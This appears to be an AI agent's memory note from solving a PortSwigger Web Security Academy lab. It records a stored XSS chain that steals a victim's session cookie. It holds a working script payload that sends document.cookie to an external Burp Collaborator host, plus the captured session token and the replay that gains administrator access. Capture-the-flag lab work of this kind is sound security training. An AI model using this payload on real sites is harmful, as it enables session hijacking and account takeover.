---
metadata:
  node_type: memory
name: "PRS arm A lab-stealing-cookies"
description: "arm A 基线：lab-stealing-cookies 一次通过 - 评论体存储 XSS 经 Burp Collaborator 窃取 victim session，重放 /my-account 得 administrator，banner solved"
last_updated: 2026-10-09T04:11:58+08:00
created: 2026-10-09T04:11:58+08:00
---

Target: Exploiting cross-site scripting to steal cookies (practitioner).
Instance: https://0a2300ad03916f1e811df8fa002b0065.web-security-academy.net/ (range_launch launch-url, reused:false).
Lab has NO exploit server; page_read description states: victim views all comments; platform firewall blocks lab→arbitrary external systems, so exfil must go to Burp Collaborator's public server.

Chain:
1. Recon /post?postId=4: comment form fields csrf, postId, comment, name, email, website(pattern `(http:|https:).+`). Posted `<b>zz41</b>` → server rendered it raw inside `<p>` → stored XSS sink is the comment body.
2. Set-Cookie probe: `session=...; Secure; SameSite=None` — no HttpOnly, so document.cookie is readable.
3. `burp_collab new --state /tmp/lsc-collab.json` → payload host `39a6o68xh3u8tpbzn1y30unvimocc1.oastify.com`.
4. Second comment payload: `<script>new Image().src='//39a6...oastify.com/'+document.cookie</script>` (verified stored raw via http_dump; http_session's body guard strips `<script>` in snippets, so use http_dump to confirm storage).
5. `burp_collab poll` → 4 DNS (type 1/65) + 1 HTTPS interaction from 34.251.122.40, UA `(Victim) Chrome/154`. b64-decoded request line:
   `GET /secret=13TO5T9kubBgLiBYetlxn9m4wqPyplU3;%20session=c7dvQyIB2bhwMvcUNtVcqyaDJB1sevIM HTTP/1.1`
6. Replayed `Cookie: session=c7dvQyIB2bhwMvcUNtVcqyaDJB1sevIM` → GET /my-account → "Your username is: administrator" + Log out link = impersonation done.
7. banner_verdict → solved:true, "Congratulations, you solved the lab!".

Traps/facts:
- Victim's document.cookie held two cookies: `secret=...` and `session=...`; only `session` is the impersonation credential.
- The /my-account response fetched at the moment of impersonation still rendered `is-notsolved`; the solve registers asynchronously — re-read the banner (banner_verdict) before judging. Solved state is lab-global (shows with both our jar and the victim jar).
- Only Burp Collaborator's public server is reachable from the victim; a self-hosted oob_serve cannot receive here.
- Pieces used: range_launch, page_read, http_session, http_dump, burp_collab, b64, banner_verdict (no new piece needed).

